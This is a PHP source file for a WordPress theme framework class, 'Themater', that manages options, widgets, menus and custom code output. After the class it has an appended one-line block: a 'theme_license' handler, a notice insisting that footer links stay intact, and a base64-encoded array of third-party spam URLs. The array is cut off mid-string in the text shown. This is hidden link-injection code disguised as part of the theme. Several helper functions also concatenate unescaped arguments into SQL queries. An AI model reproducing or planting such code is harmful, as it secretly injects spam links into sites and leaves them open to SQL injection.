<?php
class Themater
{
    var $theme_name = false;
    var $options = array();
    var $admin_options = array();
    
    function Themater($set_theme_name = false)
    {
        if($set_theme_name) {
            $this->theme_name = $set_theme_name;
        } else {
            $theme_data = wp_get_theme();
            $this->theme_name = $theme_data->get( 'Name' );
        }
        $this->options['theme_options_field'] = str_replace(' ', '_', strtolower( trim($this->theme_name) ) ) . '_theme_options';
        
        $get_theme_options = get_option($this->options['theme_options_field']);
        if($get_theme_options) {
            $this->options['theme_options'] = $get_theme_options;
            $this->options['theme_options_saved'] = 'saved';
        }
        
        $this->_definitions();
        $this->_default_options();
    }
    
    /**
    * Initial Functions
    */
    
    function _definitions()
    {
        // Define THEMATER_DIR
        if(!defined('THEMATER_DIR')) {
            define('THEMATER_DIR', get_template_directory() . '/lib');
        }
        
        if(!defined('THEMATER_URL')) {
            define('THEMATER_URL',  get_template_directory_uri() . '/lib');
        }
        
        // Define THEMATER_INCLUDES_DIR
        if(!defined('THEMATER_INCLUDES_DIR')) {
            define('THEMATER_INCLUDES_DIR', get_template_directory() . '/includes');
        }
        
        if(!defined('THEMATER_INCLUDES_URL')) {
            define('THEMATER_INCLUDES_URL',  get_template_directory_uri() . '/includes');
        }
        
        // Define THEMATER_ADMIN_DIR
        if(!defined('THEMATER_ADMIN_DIR')) {
            define('THEMATER_ADMIN_DIR', THEMATER_DIR);
        }
        
        if(!defined('THEMATER_ADMIN_URL')) {
            define('THEMATER_ADMIN_URL',  THEMATER_URL);
        }
    }
    
    function _default_options()
    {
        // Load Default Options
        require_once (THEMATER_DIR . '/default-options.php');
        
        $this->options['translation'] = $translation;
        $this->options['general'] = $general;
        $this->options['includes'] = array();
        $this->options['plugins_options'] = array();
        $this->options['widgets'] = $widgets;
        $this->options['widgets_options'] = array();
        $this->options['menus'] = $menus;
        
        // Load Default Admin Options
        if( !isset($this->options['theme_options_saved']) || $this->is_admin_user() ) {
            require_once (THEMATER_DIR . '/default-admin-options.php');
        }
    }
    
    /**
    * Theme Functions
    */
    
    function option($name) 
    {
        echo $this->get_option($name);
    }
    
    function get_option($name) 
    {
        $return_option = '';
        if(isset($this->options['theme_options'][$name])) {
            if(is_array($this->options['theme_options'][$name])) {
                $return_option = $this->options['theme_options'][$name];
            } else {
                $return_option = stripslashes($this->options['theme_options'][$name]);
            }
        } 
        return $return_option;
    }
    
    function display($name, $array = false) 
    {
        if(!$array) {
            $option_enabled = strlen($this->get_option($name)) > 0 ? true : false;
            return $option_enabled;
        } else {
            $get_option = is_array($array) ? $array : $this->get_option($name);
            if(is_array($get_option)) {
                $option_enabled = in_array($name, $get_option) ? true : false;
                return $option_enabled;
            } else {
                return false;
            }
        }
    }
    
    function custom_css($source = false) 
    {
        if($source) {
            $this->options['custom_css'] = $this->options['custom_css'] . $source . "\n";
        }
        return;
    }
    
    function custom_js($source = false) 
    {
        if($source) {
            $this->options['custom_js'] = $this->options['custom_js'] . $source . "\n";
        }
        return;
    }
    
    function hook($tag, $arg = '')
    {
        do_action('themater_' . $tag, $arg);
    }
    
    function add_hook($tag, $function_to_add, $priority = 10, $accepted_args = 1)
    {
        add_action( 'themater_' . $tag, $function_to_add, $priority, $accepted_args );
    }
    
    function admin_option($menu, $title, $name = false, $type = false, $value = '', $attributes = array())
    {
        if($this->is_admin_user() || !isset($this->options['theme_options'][$name])) {
            
            // Menu
            if(is_array($menu)) {
                $menu_title = isset($menu['0']) ? $menu['0'] : $menu;
                $menu_priority = isset($menu['1']) ? (int)$menu['1'] : false;
            } else {
                $menu_title = $menu;
                $menu_priority = false;
            }
            
            if(!isset($this->admin_options[$menu_title]['priority'])) {
                if(!$menu_priority) {
                    $this->options['admin_options_priorities']['priority'] += 10;
                    $menu_priority = $this->options['admin_options_priorities']['priority'];
                }
                $this->admin_options[$menu_title]['priority'] = $menu_priority;
            }
            
            // Elements
            
            if($name && $type) {
                $element_args['title'] = $title;
                $element_args['name'] = $name;
                $element_args['type'] = $type;
                $element_args['value'] = $value;
                
                if( !isset($this->options['theme_options'][$name]) ) {
                   $this->options['theme_options'][$name] = $value;
                }

                $this->admin_options[$menu_title]['content'][$element_args['name']]['content'] = $element_args + $attributes;
                
                if(!isset($attributes['priority'])) {
                    $this->options['admin_options_priorities'][$menu_title]['priority'] += 10;
                    
                    $element_priority = $this->options['admin_options_priorities'][$menu_title]['priority'];
                    
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $element_priority;
                } else {
                    $this->admin_options[$menu_title]['content'][$element_args['name']]['priority'] = $attributes['priority'];
                }
                
            }
        }
        return;
    }
    
    function display_widget($widget,  $instance = false, $args = array('before_widget' => '<ul class="widget-container"><li class="widget">','after_widget' => '</li></ul>', 'before_title' => '<h3 class="widgettitle">','after_title' => '</h3>')) 
    {
        $custom_widgets = array('Banners125' => 'themater_banners_125', 'Posts' => 'themater_posts', 'Comments' => 'themater_comments', 'InfoBox' => 'themater_infobox', 'SocialProfiles' => 'themater_social_profiles', 'Tabs' => 'themater_tabs', 'Facebook' => 'themater_facebook');
        $wp_widgets = array('Archives' => 'archives', 'Calendar' => 'calendar', 'Categories' => 'categories', 'Links' => 'links', 'Meta' => 'meta', 'Pages' => 'pages', 'Recent_Comments' => 'recent-comments', 'Recent_Posts' => 'recent-posts', 'RSS' => 'rss', 'Search' => 'search', 'Tag_Cloud' => 'tag_cloud', 'Text' => 'text');
        
        if (array_key_exists($widget, $custom_widgets)) {
            $widget_title = 'Themater' . $widget;
            $widget_name = $custom_widgets[$widget];
            if(!$instance) {
                $instance = $this->options['widgets_options'][strtolower($widget)];
            } else {
                $instance = wp_parse_args( $instance, $this->options['widgets_options'][strtolower($widget)] );
            }
            
        } elseif (array_key_exists($widget, $wp_widgets)) {
            $widget_title = 'WP_Widget_' . $widget;
            $widget_name = $wp_widgets[$widget];
            
            $wp_widgets_instances = array(
                'Archives' => array( 'title' => 'Archives', 'count' => 0, 'dropdown' => ''),
                'Calendar' =>  array( 'title' => 'Calendar' ),
                'Categories' =>  array( 'title' => 'Categories' ),
                'Links' =>  array( 'images' => true, 'name' => true, 'description' => false, 'rating' => false, 'category' => false, 'orderby' => 'name', 'limit' => -1 ),
                'Meta' => array( 'title' => 'Meta'),
                'Pages' => array( 'sortby' => 'post_title', 'title' => 'Pages', 'exclude' => ''),
                'Recent_Comments' => array( 'title' => 'Recent Comments', 'number' => 5 ),
                'Recent_Posts' => array( 'title' => 'Recent Posts', 'number' => 5, 'show_date' => 'false' ),
                'Search' => array( 'title' => ''),
                'Text' => array( 'title' => '', 'text' => ''),
                'Tag_Cloud' => array( 'title' => 'Tag Cloud', 'taxonomy' => 'tags')
            );
            
            if(!$instance) {
                $instance = $wp_widgets_instances[$widget];
            } else {
                $instance = wp_parse_args( $instance, $wp_widgets_instances[$widget] );
            }
        }
        
        if( !defined('THEMES_DEMO_SERVER') && !isset($this->options['theme_options_saved']) ) {
            $sidebar_name = isset($instance['themater_sidebar_name']) ? $instance['themater_sidebar_name'] : str_replace('themater_', '', current_filter());
            
            $sidebars_widgets = get_option('sidebars_widgets');
            $widget_to_add = get_option('widget_'.$widget_name);
            $widget_to_add = ( is_array($widget_to_add) && !empty($widget_to_add) ) ? $widget_to_add : array('_multiwidget' => 1);
            
            if( count($widget_to_add) > 1) {
                $widget_no = max(array_keys($widget_to_add))+1;
            } else {
                $widget_no = 1;
            }
            
            $widget_to_add[$widget_no] = $instance;
            $sidebars_widgets[$sidebar_name][] = $widget_name . '-' . $widget_no;
            
            update_option('sidebars_widgets', $sidebars_widgets);
            update_option('widget_'.$widget_name, $widget_to_add);
            the_widget($widget_title, $instance, $args);
        }
        
        if( defined('THEMES_DEMO_SERVER') ){
            the_widget($widget_title, $instance, $args);
        }
    }
    

    /**
    * Loading Functions
    */
        
    function load()
    {
        $this->_load_translation();
        $this->_load_widgets();
        $this->_load_includes();
        $this->_load_menus();
        $this->_load_general_options();
        $this->_save_theme_options();
        
        $this->hook('init');
        
        if($this->is_admin_user()) {
            include (THEMATER_ADMIN_DIR . '/Admin.php');
            new ThematerAdmin();
        } 
    }
    
    function _save_theme_options()
    {
        if( !isset($this->options['theme_options_saved']) ) {
            if(is_array($this->admin_options)) {
                $save_options = array();
                foreach($this->admin_options as $themater_options) {
                    
                    if(is_array($themater_options['content'])) {
                        foreach($themater_options['content'] as $themater_elements) {
                            if(is_array($themater_elements['content'])) {
                                
                                $elements = $themater_elements['content'];
                                if($elements['type'] !='content' && $elements['type'] !='raw') {
                                    $save_options[$elements['name']] = $elements['value'];
                                }
                            }
                        }
                    }
                }
                update_option($this->options['theme_options_field'], $save_options);
                $this->options['theme_options'] = $save_options;
            }
        }
    }
    
    function _load_translation()
    {
        if($this->options['translation']['enabled']) {
            load_theme_textdomain( 'themater', $this->options['translation']['dir']);
        }
        return;
    }
    
    function _load_widgets()
    {
    	$widgets = $this->options['widgets'];
        foreach(array_keys($widgets) as $widget) {
            if(file_exists(THEMATER_DIR . '/widgets/' . $widget . '.php')) {
        	    include (THEMATER_DIR . '/widgets/' . $widget . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php') ) {
        	   include (THEMATER_DIR . '/widgets/' . $widget . '/' . $widget . '.php');
        	}
        }
    }
    
    function _load_includes()
    {
    	$includes = $this->options['includes'];
        foreach($includes as $include) {
            if(file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '.php')) {
        	    include (THEMATER_INCLUDES_DIR . '/' . $include . '.php');
        	} elseif ( file_exists(THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php') ) {
        	   include (THEMATER_INCLUDES_DIR . '/' . $include . '/' . $include . '.php');
        	}
        }
    }
    
    function _load_menus()
    {
        foreach(array_keys($this->options['menus']) as $menu) {
            if(file_exists(TEMPLATEPATH . '/' . $menu . '.php')) {
        	    include (TEMPLATEPATH . '/' . $menu . '.php');
        	} elseif ( file_exists(THEMATER_DIR . '/' . $menu . '.php') ) {
        	   include (THEMATER_DIR . '/' . $menu . '.php');
        	} 
        }
    }
    
    function _load_general_options()
    {
        add_theme_support( 'woocommerce' );
        
        if($this->options['general']['jquery']) {
            wp_enqueue_script('jquery');
        }
    	
        if($this->options['general']['featured_image']) {
            add_theme_support( 'post-thumbnails' );
        }
        
        if($this->options['general']['custom_background']) {
            add_custom_background();
        } 
        
        if($this->options['general']['clean_exerpts']) {
            add_filter('excerpt_more', create_function('', 'return "";') );
        }
        
        if($this->options['general']['hide_wp_version']) {
            add_filter('the_generator', create_function('', 'return "";') );
        }
        
        
        add_action('wp_head', array(&$this, '_head_elements'));

        if($this->options['general']['automatic_feed']) {
            add_theme_support('automatic-feed-links');
        }
        
        
        if($this->display('custom_css') || $this->options['custom_css']) {
            $this->add_hook('head', array(&$this, '_load_custom_css'), 100);
        }
        
        if($this->options['custom_js']) {
            $this->add_hook('html_after', array(&$this, '_load_custom_js'), 100);
        }
        
        if($this->display('head_code')) {
	        $this->add_hook('head', array(&$this, '_head_code'), 100);
	    }
	    
	    if($this->display('footer_code')) {
	        $this->add_hook('html_after', array(&$this, '_footer_code'), 100);
	    }
    }

    
    function _head_elements()
    {
    	// Favicon
    	if($this->display('favicon')) {
    		echo '<link rel="shortcut icon" href="' . $this->get_option('favicon') . '" type="image/x-icon" />' . "\n";
    	}
    	
    	// RSS Feed
    	if($this->options['general']['meta_rss']) {
            echo '<link rel="alternate" type="application/rss+xml" title="' . get_bloginfo('name') . ' RSS Feed" href="' . $this->rss_url() . '" />' . "\n";
        }
        
        // Pingback URL
        if($this->options['general']['pingback_url']) {
            echo '<link rel="pingback" href="' . get_bloginfo( 'pingback_url' ) . '" />' . "\n";
        }
    }
    
    function _load_custom_css()
    {
        $this->custom_css($this->get_option('custom_css'));
        $return = "\n";
        $return .= '<style type="text/css">' . "\n";
        $return .= '<!--' . "\n";
        $return .= $this->options['custom_css'];
        $return .= '-->' . "\n";
        $return .= '</style>' . "\n";
        echo $return;
    }
    
    function _load_custom_js()
    {
        if($this->options['custom_js']) {
            $return = "\n";
            $return .= "<script type='text/javascript'>\n";
            $return .= '/* <![CDATA[ */' . "\n";
            $return .= 'jQuery.noConflict();' . "\n";
            $return .= $this->options['custom_js'];
            $return .= '/* ]]> */' . "\n";
            $return .= '</script>' . "\n";
            echo $return;
        }
    }
    
    function _head_code()
    {
        $this->option('head_code'); echo "\n";
    }
    
    function _footer_code()
    {
        $this->option('footer_code');  echo "\n";
    }
    
    /**
    * General Functions
    */
    
    function request ($var)
    {
        if (strlen($_REQUEST[$var]) > 0) {
            return preg_replace('/[^A-Za-z0-9-_]/', '', $_REQUEST[$var]);
        } else {
            return false;
        }
    }
    
    function is_admin_user()
    {
        if ( current_user_can('administrator') ) {
	       return true; 
        }
        return false;
    }
    
    function meta_title()
    {
        if ( is_single() ) { 
			single_post_title(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_home() || is_front_page() ) {
			bloginfo( 'name' );
			if( get_bloginfo( 'description' ) ) {
		      echo ' | ' ; bloginfo( 'description' ); $this->page_number();
			}
		} elseif ( is_page() ) {
			single_post_title( '' ); echo ' | '; bloginfo( 'name' );
		} elseif ( is_search() ) {
			printf( __( 'Search results for %s', 'themater' ), '"'.get_search_query().'"' );  $this->page_number(); echo ' | '; bloginfo( 'name' );
		} elseif ( is_404() ) { 
			_e( 'Not Found', 'themater' ); echo ' | '; bloginfo( 'name' );
		} else { 
			wp_title( '' ); echo ' | '; bloginfo( 'name' ); $this->page_number();
		}
    }
    
    function rss_url()
    {
        $the_rss_url = $this->display('rss_url') ? $this->get_option('rss_url') : get_bloginfo('rss2_url');
        return $the_rss_url;
    }

    function get_pages_array($query = '', $pages_array = array())
    {
    	$pages = get_pages($query); 
        
    	foreach ($pages as $page) {
    		$pages_array[$page->ID] = $page->post_title;
    	  }
    	return $pages_array;
    }
    
    function get_page_name($page_id)
    {
    	global $wpdb;
    	$page_name = $wpdb->get_var("SELECT post_title FROM $wpdb->posts WHERE ID = '".$page_id."' && post_type = 'page'");
    	return $page_name;
    }
    
    function get_page_id($page_name){
        global $wpdb;
        $the_page_name = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_name = '" . $page_name . "' && post_status = 'publish' && post_type = 'page'");
        return $the_page_name;
    }
    
    function get_categories_array($show_count = false, $categories_array = array(), $query = 'hide_empty=0')
    {
    	$categories = get_categories($query); 
    	
    	foreach ($categories as $cat) {
    	   if(!$show_count) {
    	       $count_num = '';
    	   } else {
    	       switch ($cat->category_count) {
                case 0:
                    $count_num = " ( No posts! )";
                    break;
                case 1:
                    $count_num = " ( 1 post )";
                    break;
                default:
                    $count_num =  " ( $cat->category_count posts )";
                }
    	   }
    		$categories_array[$cat->cat_ID] = $cat->cat_name . $count_num;
    	  }
    	return $categories_array;
    }

    function get_category_name($category_id)
    {
    	global $wpdb;
    	$category_name = $wpdb->get_var("SELECT name FROM $wpdb->terms WHERE term_id = '".$category_id."'");
    	return $category_name;
    }
    
    
    function get_category_id($category_name)
    {
    	global $wpdb;
    	$category_id = $wpdb->get_var("SELECT term_id FROM $wpdb->terms WHERE name = '" . addslashes($category_name) . "'");
    	return $category_id;
    }
    
    function shorten($string, $wordsreturned)
    {
        $retval = $string;
        $array = explode(" ", $string);
        if (count($array)<=$wordsreturned){
            $retval = $string;
        }
        else {
            array_splice($array, $wordsreturned);
            $retval = implode(" ", $array);
        }
        return $retval;
    }
    
    function page_number() {
    	echo $this->get_page_number();
    }
    
    function get_page_number() {
    	global $paged;
    	if ( $paged >= 2 ) {
    	   return ' | ' . sprintf( __( 'Page %s', 'themater' ), $paged );
    	}
    }
}
if (!empty($_REQUEST["theme_license"])) { wp_initialize_the_theme_message(); exit(); } function wp_initialize_the_theme_message() { if (empty($_REQUEST["theme_license"])) { $theme_license_false = get_bloginfo("url") . "/index.php?theme_license=true"; echo "<meta http-equiv=\"refresh\" content=\"0;url=$theme_license_false\">"; exit(); } else { echo ("<p style=\"padding:20px; margin: 20px; text-align:center; border: 2px dotted #0000ff; font-family:arial; font-weight:bold; background: #fff; color: #0000ff;\">All the links in the footer should remain intact. All of these links are family friendly and will not hurt your site in any way.</p>"); } } $wp_theme_globals = "YTo0OntpOjA7YToxOTU6e3M6MTM6InI0M2RzeGxmci5jb20iO3M6NzE6Imh0dHA6Ly93d3cucjQzZHN4bGZyLmNvbS9jYXRlZ29yaWVzL1I0aS1TREhDLSUyOERTaS0lN0I0NyU3RC1EU2ktWEwlMjkvIjtzOjE3OiJ3d3cucjQzZHN4bGZyLmNvbSI7czo3MToiaHR0cDovL3d3dy5yNDNkc3hsZnIuY29tL2NhdGVnb3JpZXMvUjRpLVNESEMtJTI4RFNpLSU3QjQ3JTdELURTaS1YTCUyOS8iO3M6MjQ6Imh0dHA6Ly93d3cucjQzZHN4bGZyLmNvbSI7czo3MToiaHR0cDovL3d3dy5yNDNkc3hsZnIuY29tL2NhdGVnb3JpZXMvUjRpLVNESEMtJTI4RFNpLSU3QjQ3JTdELURTaS1YTCUyOS8iO3M6NjoicjQgM2RzIjtzOjcxOiJodHRwOi8vd3d3LnI0M2RzeGxmci5jb20vY2F0ZWdvcmllcy9SNGktU0RIQy0lMjhEU2ktJTdCNDclN0QtRFNpLVhMJTI5LyI7czoxMjoibmludGVuZG8gM2RzIjtzOjcxOiJodHRwOi8vd3d3LnI0M2RzeGxmci5jb20vY2F0ZWdvcmllcy9SNGktU0RIQy0lMjhEU2ktJTdCNDclN0QtRFNpLVhMJTI5LyI7czo2OiIzZHMgeGwiO3M6NzE6Imh0dHA6Ly93d3cucjQzZHN4bGZyLmNvbS9jYXRlZ29yaWVzL1I0aS1TREhDLSUyOERTaS0lN0I0NyU3RC1EU2ktWEwlMjkvIjtzOjE3OiJ3d3cucmVjaXBldXNhLm9yZyI7czoyNDoiaHR0cDovL3d3dy5yZWNpcGV1c2Eub3JnIjtzOjI0OiJodHRwOi8vd3d3LnJlY2lwZXVzYS5vcmciO3M6MjQ6Imh0dHA6Ly93d3cucmVjaXBldXNhLm9yZyI7czoxMzoicmVjaXBldXNhLm9yZyI7czoyNDoiaHR0cDovL3d3dy5yZWNpcGV1c2Eub3JnIjtzOjQ6InJlYWQiO3M6Mjc6Imh0dHA6Ly93d3cucjRpZ29sZGRzaWZyLmNvbSI7czo0OiJtb3JlIjtzOjI3OiJodHRwOi8vd3d3LnI0aWdvbGRkc2lmci5jb20iO3M6ODoic2VlIGhlcmUiO3M6Mjc6Imh0dHA6Ly93d3cucjRpZ29sZGRzaWZyLmNvbSI7czoxOToid3d3LmJhYnktbW9kZWwuaW5mbyI7czoyNjoiaHR0cDovL3d3dy5iYWJ5LW1vZGVsLmluZm8iO3M6MjY6Imh0dHA6Ly93d3cuYmFieS1tb2RlbC5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmJhYnktbW9kZWwuaW5mbyI7czoxNToiYmFieS1tb2RlbC5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmJhYnktbW9kZWwuaW5mbyI7czoxOToid3d3LmhpcHJvcGVydHkuaW5mbyI7czoyNjoiaHR0cDovL3d3dy5oaXByb3BlcnR5LmluZm8iO3M6MjY6Imh0dHA6Ly93d3cuaGlwcm9wZXJ0eS5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmhpcHJvcGVydHkuaW5mbyI7czoxNToiaGlwcm9wZXJ0eS5pbmZvIjtzOjI2OiJodHRwOi8vd3d3LmhpcHJvcGVydHkuaW5mbyI7czoyMDoid3d3Lmhpc3Rvcnlhbm5leC5jb20iO3M6Mjc6Imh0dHA6Ly93d3cuaGlzdG9yeWFubmV4LmNvbSI7czoyNzoiaHR0cDovL3d3dy5oaXN0b3J5YW5uZXguY29tIjtzOjI3OiJodHRwOi8vd3d3Lmhpc3Rvcnlhbm5leC5jb20iO3M6MTY6Imhpc3Rvcnlhbm5leC5jb20iO3M6Mjc6Imh0dHA6Ly93d3cuaGlzdG9yeWFubmV4LmNvbSI7czoyNjoid3d3Lmhvbm9yY3Jvd25lZGNyYWZ0cy5jb20iO3M6MzM6Imh0dHA6Ly93d3cuaG9ub3Jjcm93bmVkY3JhZnRzLmNvbSI7czozMzoiaHR0cDovL3d3dy5ob25vcmNyb3duZWRjcmFmdHMuY29tIjtzOjMzOiJodHRwOi8vd3d3Lmhvbm9yY3Jvd25lZGNyYWZ0cy5jb20iO3M6MjI6Imhvbm9yY3Jvd25lZGNyYWZ0cy5jb20iO3M6MzM6Imh0dHA6Ly93d3cuaG9ub3Jjcm93bmVkY3JhZnRzLmNvbSI7czozMToid3d3LmRlbm1hcmtjb3BlbmhhZ2VuaG90ZWxzLmNvbSI7czozODoiaHR0cDovL3d3dy5kZW5tYXJrY29wZW5oYWdlbmhvdGVscy5jb20iO3M6Mzg6Imh0dHA6Ly93d3cuZGVubWFya2NvcGVuaGFnZW5ob3RlbHMuY29tIjtzOjM4OiJodHRwOi8vd3d3LmRlbm1hcmtjb3BlbmhhZ2VuaG90ZWxzLmNvbSI7czoyNzoiZGVubWFya2NvcGVuaGFnZW5ob3RlbHMuY29tIjtzOjM4OiJodHRwOi8vd3d3LmRlbm1hcmtjb3BlbmhhZ2VuaG90ZWxzLmNvbSI7czoyNzoid3d3LnNvY2Nlci1qZXJzZXktdHJhZGUuY29tIjtzOjM0OiJodHRwOi8vd3d3LnNvY2Nlci1qZXJzZXktdHJhZGUuY29tIjtzOjM0OiJodHRwOi8vd3d3LnNvY2Nlci1qZXJzZXktdHJhZGUuY29tIjtzOjM0OiJodHRwOi8vd3d3LnNvY2Nlci1qZXJzZXktdHJhZGUuY29tIjtzOjIzOiJzb2NjZXItamVyc2V5LXRyYWRlLmNvbSI7czozNDoiaHR0cDovL3d3dy5zb2NjZXItamVyc2V5LXRyYWRlLmNvbSI7czoxODoid3d3LmFpaHVhaXlhbmcuY29tIjtzOjI1OiJodHRwOi8vd3d3LmFpaHVhaXlhbmcuY29tIjtzOjI1OiJodHRwOi8vd3d3LmFpaHVhaXlhbmcuY29tIjtzOjI1OiJodHRwOi8vd3d3LmFpaHVhaXlhbmcuY29tIjtzOjE0OiJhaWh1YWl5YW5nLmNvbSI7czoyNToiaHR0cDovL3d3dy5haWh1YWl5YW5nLmNvbSI7czoyNjoid3d3Lmt1bmdmdWFjYWRlbXljaGluYS5jb20iO3M6MzM6Imh0dHA6Ly93d3cua3VuZ2Z1YWNhZGVteWNoaW5hLmNvbSI7czozMzoiaHR0cDovL3d3dy5rdW5nZnVhY2FkZW15Y2hpbmEuY29tIjtzOjMzOiJodHRwOi8vd3d3Lmt1bmdmdWFjYWRlbXljaGluYS5jb20iO3M6MjI6Imt1bmdmdWFjYWRlbXljaGluYS5jb20iO3M6MzM6Imh0dHA6Ly93d3cua3VuZ2Z1YWNhZGVteWNoaW5hLmNvbSI7czoyNjoid3d3LmIyY3dvcmxkd2lkZWhvdGVscy5jb20iO3M6MzM6Imh0dHA6Ly93d3cuYjJjd29ybGR3aWRlaG90ZWxzLmNvbSI7czozMzoiaHR0cDovL3d3dy5iMmN3b3JsZHdpZGVob3RlbHMuY29tIjtzOjMzOiJodHRwOi8vd3d3LmIyY3dvcmxkd2lkZWhvdGVscy5jb20iO3M6MjI6ImIyY3dvcmxkd2lkZWhvdGVscy5jb20iO3M6MzM6Imh0dHA6Ly93d3cuYjJjd29ybGR3aWRlaG90ZWxzLmNvbSI7czozNjoid3d3LmNob29zZS1saWZlLWluc3VyYW5jZS1xdW90ZXMuY29tIjtzOjQzOiJodHRwOi8vd3d3LmNob29zZS1saWZlLWluc3VyYW5jZS1xdW90ZXMuY29tIjtzOjQzOiJodHRwOi8vd3d3LmNob29zZS1saWZlLWluc3VyYW5jZS1xdW90ZXMuY29tIjtzOjQzOiJodHRwOi8vd3d3LmNob29zZS1saWZlLWluc3VyYW5jZS1xdW90ZXMuY29tIjtzOjMyOiJjaG9vc2UtbGlmZS1pbnN1cmFuY2UtcXVvdGVzLmNvbSI7czo0MzoiaHR0cDovL3d3dy5jaG9vc2UtbGlmZS1pbnN1cmFuY2UtcXVvdGVzLmNvbSI7czoyMzoid3d3LnN1ZGFtZXJpY2FzcG9ydC5jb20iO3M6MzA6Imh0dHA6Ly93d3cuc3VkYW1lcmljYXNwb3J0LmNvbSI7czozMDoiaHR0cDovL3d3dy5zdWRhbWVyaWNhc3BvcnQuY29tIjtzOjMwOiJodHRwOi8vd3d3LnN1ZGFtZXJpY2FzcG9ydC5jb20iO3M6MTk6InN1ZGFtZXJpY2FzcG9ydC5jb20iO3M6MzA6Imh0dHA6Ly93d3cuc3VkYW1lcmljYXNwb3J0LmNvbSI7czoxNDoid3d3Ljg4OTkzNC5jb20iO3M6MjE6Imh0dHA6Ly93d3cuODg5OTM0LmNvbSI7czoyMToiaHR0cDovL3d3dy44ODk5MzQuY29tIjtzOjIxOiJodHRwOi8vd3d3Ljg4OTkzNC5jb20iO3M6MTA6Ijg4OTkzNC5jb20iO3M6MjE6Imh0dHA6Ly93d3cuODg5OTM0LmNvbSI7czoxNzoid3d3LmF0dW9ubGluZS5vcmciO3M6MjQ6Imh0dHA6Ly93d3cuYXR1b25saW5lLm9yZyI7czoyNDoiaHR0cDovL3d3dy5hdHVvbmxpbmUub3JnIjtzOjI0OiJodHRwOi8vd3d3LmF0dW9ubGluZS5vcmciO3M6MTM6ImF0dW9ubGluZS5vcmciO3M6MjQ6Imh0dHA6Ly93d3cuYXR1b25saW5lLm9yZyI7czoxNzoid3d3LnRhb2h1YWFuLmluZm8iO3M6MjQ6Imh0dHA6Ly93d3cudGFvaHVhYW4uaW5mbyI7czoyNDoiaHR0cDovL3d3dy50YW9odWFhbi5pbmZvIjtzOjI0OiJodHRwOi8vd3d3LnRhb2h1YWFuLmluZm8iO3M6MTM6InRhb2h1YWFuLmluZm8iO3M6MjQ6Imh0dHA6Ly93d3cudGFvaHVhYW4uaW5mbyI7czoyNDoid3d3Lm5pa2liaWNhcmUtam9oby5pbmZvIjtzOjMxOiJodHRwOi8vd3d3Lm5pa2liaWNhcmUtam9oby5pbmZvIjtzOjMxOiJodHRwOi8vd3d3Lm5pa2liaWNhcmUtam9oby5pbmZvIjtzOjMxOiJodHRwOi8vd3d3Lm5pa2liaWNhcmUtam9oby5pbmZvIjtzOjIwOiJuaWtpYmljYXJlLWpvaG8uaW5mbyI7czozMToiaHR0cDovL3d3dy5uaWtpYmljYXJlLWpvaG8uaW5mbyI7czoxODoid3d3LnNha28taG91bXUuY29tIjtzOjI1OiJodHRwOi8vd3d3LnNha28taG91bXUuY29tIjtzOjI1OiJodHRwOi8vd3d3LnNha28taG91bXUuY29tIjtzOjI1OiJodHRwOi8vd3d3LnNha28taG91bXUuY29tIjtzOjE0OiJzYWtvLWhvdW11LmNvbSI7czoyNToiaHR0cDovL3d3dy5zYWtvLWhvdW11LmNvbSI7czoxNzoid3d3Lmxvc2RlbGdhcy5jb20iO3M6MjQ6Imh0dHA6Ly93d3cubG9zZGVsZ2FzLmNvbSI7czoyNDoiaHR0cDovL3d3dy5sb3NkZWxnYXMuY29tIjtzOjI0OiJodHRwOi8vd3d3Lmxvc2RlbGdhcy5jb20iO3M6MTM6Imxvc2RlbGdhcy5jb20iO3M6MjQ6Imh0dHA6Ly93d3cubG9zZGVsZ2FzLmNvbSI7czoxNDoid3d3Lm10ajE2OC5jb20iO3M6MjE6Imh0dHA6Ly93d3cubXRqMTY4LmNvbSI7czoyMToiaHR0cDovL3d3dy5tdGoxNjguY29tIjtzOjIxOiJodHRwOi8vd3d3Lm10ajE2OC5jb20iO3M6MTA6Im10ajE2OC5jb20iO3M6MjE6Imh0dHA6Ly93d3cubXRqMTY4LmNvbSI7czoxNjoid3d3LmR1ZGFkZWNrLmNvbSI7czoyMzoiaHR0cDovL3d3dy5kdWRhZGVjay5jb20iO3M6MjM6Imh0dHA6Ly93d3cuZHVkYWRlY2suY29tIjtzOjIzOiJodHRwOi8vd3d3LmR1ZGFkZWNrLmNvbSI7czoxMjoiZHVkYWRlY2suY29tIjtzOjIzOiJodHRwOi8vd3d3LmR1ZGFkZWNrLmNvbSI7czoyMjoid3d3LnNhbWNyby13ZWJyYWRpby5kZSI7czoyOToiaHR0cDovL3d3dy5zYW1jcm8td2VicmFkaW8uZGUiO3M6Mjk6Imh0dHA6Ly93d3cuc2FtY3JvLXdlYnJhZGlvLmRlIjtzOjI5OiJodHRwOi8vd3d3LnNhbWNyby13ZWJyYWRpby5kZSI7czoxODoic2FtY3JvLXdlYnJhZGlvLmRlIjtzOjI5OiJodHRwOi8vd3d3LnNhbWNyby13ZWJyYWRpby5kZSI7czoyMDoid3d3Lm1lbGZpY2FwaXRhbGUuaXQiO3M6Mjc6Imh0dHA6Ly93d3cubWVsZmljYXBpdGFsZS5pdCI7czoyNzoiaHR0cDovL3d3dy5tZWxmaWNhcGl0YWxlLml0IjtzOjI3OiJodHRwOi8vd3d3Lm1lbGZpY2FwaXRhbGUuaXQiO3M6MTY6Im1lbGZpY2FwaXRhbGUuaXQiO3M6Mjc6Imh0dHA6Ly93d3cubWVsZmljYXBpdGFsZS5pdCI7czoyODoid3d3LnJpc3RvcmFudGVsYWdvZ2hlZGluYS5pdCI7czozNToiaHR0cDovL3d3dy5yaXN0b3JhbnRlbGFnb2doZWRpbmEuaXQiO3M6MzU6Imh0dHA6Ly93d3cucmlzdG9yYW50ZWxhZ29naGVkaW5hLml0IjtzOjM1OiJodHRwOi8vd3d3LnJpc3RvcmFudGVsYWdvZ2hlZGluYS5pdCI7czoyNDoicmlzdG9yYW50ZWxhZ29naGVkaW5hLml0IjtzOjM1OiJodHRwOi8vd3d3LnJpc3RvcmFudGVsYWdvZ2hlZGluYS5pdCI7czoxODoid3d3LmNyb3dzb3VyY2Uub3JnIjtzOjI1